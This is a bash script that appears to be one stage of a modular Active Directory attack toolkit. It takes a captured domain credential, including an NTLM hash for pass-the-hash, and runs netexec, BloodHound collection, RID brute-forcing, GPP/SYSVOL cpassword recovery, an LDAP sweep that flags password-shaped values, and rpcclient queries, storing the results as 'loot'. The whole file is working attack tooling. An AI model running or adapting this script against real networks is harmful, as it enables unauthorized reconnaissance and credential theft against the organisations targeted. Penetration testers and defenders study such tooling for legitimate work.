#!/usr/bin/env bash
# =============================================================================
#  03_enum_creds.sh  —  authenticated enumeration  (COMPOSITE, pauses)
# =============================================================================
#  Attack-chain role: once you hold ANY valid domain credential, map the domain
#  properly — users/groups/policy over LDAP, a full BloodHound collection for
#  attack paths, RID brute, and a GPP/SYSVOL cpassword sweep.
#
#  Reads the first usable credential from creds.json (prefers password, then
#  NTLM hash, then AES). Override domain with -d; DC defaults to the target.
#
#  Composite: pauses before each sub-step (y=run, n=skip, q=quit).
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
SCRIPT_ARGS="$*"
source "$SCRIPT_DIR/lib/common.sh"

usage() { cat <<'EOF'
03_enum_creds.sh — authenticated enumeration (COMPOSITE, pauses y/n/q)

USAGE:   ./03_enum_creds.sh [-t dc] [-d domain] [-q]
EXAMPLE: ./03_enum_creds.sh

FLAGS:
  -t, --target <ip>      DC to enumerate (default: scope.txt / domain.env DC_IP)
  -d, --domain <domain>  AD domain (default: cred's domain / domain.env)
  -q, --quiet            no live screen output
  -h, --help             this help
  (shared flags: --help-common)

SUB-STEPS (each pauses): netexec LDAP users/groups/password-policy + shares ·
  ldapdomaindump · BloodHound collection · RID-brute · GPP/SYSVOL cpassword ·
  authenticated LDAP attribute harvest (description/info/comment, password-shaped
  values highlighted) · bloodyad read pass (get search/object/writable) ·
  authenticated rpcclient (users/groups/domain/LSA/privs).
PREREQS: a usable credential in creds.json (get one via asreproast/kerberoast).
EOF
}

parse_common_args "$@"
set -- "${COMMON_REMAINING[@]}"
[[ "${1:-}" == "-h" || "${1:-}" == "--help" ]] && { usage; exit 0; }

[[ -n "$TARGET" ]] || die "no target: set scope.txt or pass -t <dc>"
require_creds "$DOMAIN_OVERRIDE"      # populates SEL_* or dies with a pointer
DOMAIN="$(resolve_domain)"
BASE_DN="$(derive_base_dn "$DOMAIN")" # refresh now that the cred's domain is known
AUTH="$(nxc_auth)"                    # netexec auth flags for the chosen cred
BAUTH="$(bloodyad_auth)"              # bloodyad auth flags
# authenticated rpcclient identity: DOMAIN/user%secret (+ --pw-nt-hash for a hash)
if [[ "$SEL_STYPE" == "ntlm_hash" ]]; then
  RPC_ID="$(printf '%q' "${DOMAIN}/${SEL_USER}%${SEL_SECRET}") --pw-nt-hash"
else
  RPC_ID="$(printf '%q' "${DOMAIN}/${SEL_USER}%${SEL_SECRET}")"
fi

log_begin
announce_loot
log_info "using credential ${DOMAIN}/${SEL_USER} (${SEL_STYPE}) against DC ${DC}"

# --- 1. netexec LDAP users/groups/password-policy + SMB shares ------------
if pause_step "netexec LDAP users/groups/password-policy + SMB shares"; then
  need_cmd netexec
  run_cmd "netexec ldap ${DC} ${AUTH} --users --groups"
  run_cmd "netexec ldap ${DC} ${AUTH} --password-policy"
  run_cmd "netexec smb  ${DC} ${AUTH} --shares"
fi

# --- 2. ldapdomaindump (HTML/JSON dump of the directory) ------------------
if pause_step "ldapdomaindump → ${RUN_DIR}/ldd"; then
  need_cmd ldapdomaindump
  mkdir -p "${RUN_DIR}/ldd"
  if [[ "$SEL_STYPE" == "password" ]]; then
    run_cmd "ldapdomaindump -u $(printf '%q' "${DOMAIN}\\${SEL_USER}") -p $(printf '%q' "$SEL_SECRET") -o '${RUN_DIR}/ldd' ldap://${DC}"
  else
    log_warn "ldapdomaindump has no pass-the-hash; skipping (netexec --users already covered it)"
  fi
fi

# --- 3. BloodHound collection (bloodhound-python → netexec fallback) ------
# Same "different method on retry" pattern as the setup script: try the Python
# collector first, fall back to netexec's built-in collector if it fails or
# produces no bundle. Log which one ran and where its output landed.
if pause_step "BloodHound collection (bloodhound-python, netexec fallback)"; then
  BHLOOT="$(loot_dir)"
  need_cmd bloodhound-python
  run_cmd "cd '${BHLOOT}' && bloodhound-python -d ${DOMAIN} $(bhpy_auth) -ns ${DC} -c All --zip"
  # Success = zero exit AND a bundle actually landed in the loot dir.
  if [[ "$LAST_RC" -eq 0 ]] && ls "${BHLOOT}"/*.zip "${BHLOOT}"/*bloodhound*.json >/dev/null 2>&1; then
    log_ok "BloodHound data collected by bloodhound-python → bundle in ${BHLOOT} (import the .zip into BloodHound CE)"
  else
    log_warn "bloodhound-python failed or produced no bundle — falling back to netexec --bloodhound"
    need_cmd netexec
    run_cmd "netexec ldap ${DC} ${AUTH} --bloodhound -c All --dns-server ${DC}"
    if [[ "$LAST_RC" -eq 0 ]]; then
      # netexec writes its zip under ~/.nxc/logs/ — copy the newest into loot so
      # both collectors leave their output in the same per-run place.
      newest_zip="$(ls -t "$HOME"/.nxc/logs/*.zip 2>/dev/null | head -n1)"
      if [[ -n "$newest_zip" ]]; then
        cp "$newest_zip" "${BHLOOT}/" 2>/dev/null && \
          log_ok "BloodHound data collected by netexec → ${newest_zip} (copied into ${BHLOOT}; import the .zip into BloodHound CE)" || \
          log_ok "BloodHound data collected by netexec → ${newest_zip} (import the .zip into BloodHound CE)"
      else
        log_ok "BloodHound data collected by netexec → look under ~/.nxc/logs/ (import the .zip into BloodHound CE)"
      fi
    else
      log_err "both bloodhound-python and netexec BloodHound collection failed — see master.log"
    fi
  fi
fi

# --- 4. SMB RID-brute (pull SIDs/usernames even without full LDAP) --------
if pause_step "SMB RID-brute (netexec --rid-brute)"; then
  need_cmd netexec
  run_cmd "netexec smb ${DC} ${AUTH} --rid-brute 10000"
fi

# --- 5. GPP / SYSVOL cpassword hunt ---------------------------------------
if pause_step "GPP/SYSVOL cpassword hunt (netexec gpp_password, gpp_autologin)"; then
  need_cmd netexec
  run_cmd "netexec smb ${DC} ${AUTH} -M gpp_password"
  run_cmd "netexec smb ${DC} ${AUTH} -M gpp_autologin"
  log_info "any cpassword recovered above is already AES-decrypted by the module — add it with creds_add if useful"
fi

# --- 6. Authenticated LDAP attribute harvest + password flagging ----------
# Same description/info/comment sweep as 02, but authenticated — and highlight
# any password-shaped value so a stashed cred isn't lost in the dump.
if pause_step "Authenticated LDAP attribute harvest (description/info/comment)"; then
  if [[ -z "$BASE_DN" ]]; then
    log_warn "no domain/BASE_DN — skipping LDAP harvest"
  elif [[ "$SEL_STYPE" == "password" ]]; then
    need_cmd ldapsearch
    # Simple bind (-x) with the username/password from creds.json — NOT a
    # GSSAPI/SASL bind (which would need a pre-existing Kerberos ticket this step
    # has no reason to depend on).
    run_cmd "ldapsearch -x -H ldap://${DC} -D $(printf '%q' "${SEL_USER}@${DOMAIN}") -w $(printf '%q' "$SEL_SECRET") -b '${BASE_DN}' '(&(objectCategory=person)(objectClass=user))' sAMAccountName description info comment"
    flag_ldap_secrets "$LAST_RAW_FILE"
  else
    # ldapsearch simple bind has no pass-the-hash; netexec --users surfaces the
    # same description field when authing with a hash.
    need_cmd netexec
    log_warn "hash auth: using 'netexec ldap --users' (shows descriptions) instead of ldapsearch simple bind"
    run_cmd "netexec ldap ${DC} ${AUTH} --users"
    flag_ldap_secrets "$LAST_RAW_FILE"
  fi
fi

# --- 7. bloodyad read pass (supplementary directory enumeration) ----------
if pause_step "bloodyad read enumeration (get search + get object)"; then
  need_cmd bloodyad
  run_cmd "bloodyad ${BAUTH} get search --filter '(objectClass=user)' --attr sAMAccountName,description,memberOf"
  [[ -n "$BASE_DN" ]] && run_cmd "bloodyad ${BAUTH} get object '${BASE_DN}'"
  run_cmd "bloodyad ${BAUTH} get writable"
fi

# --- 8. Authenticated rpcclient (users/groups/domain/LSA/privs) -----------
# Fast, so left as a normal sub-step (not flag-gated).
if pause_step "Authenticated rpcclient (enumdomusers/groups, querydominfo, lsaquery, enumprivs)"; then
  need_cmd rpcclient
  run_cmd "rpcclient -U ${RPC_ID} ${DC} -c 'enumdomusers;enumdomgroups;querydominfo;lsaquery;enumprivs'"
fi

log_end "success"
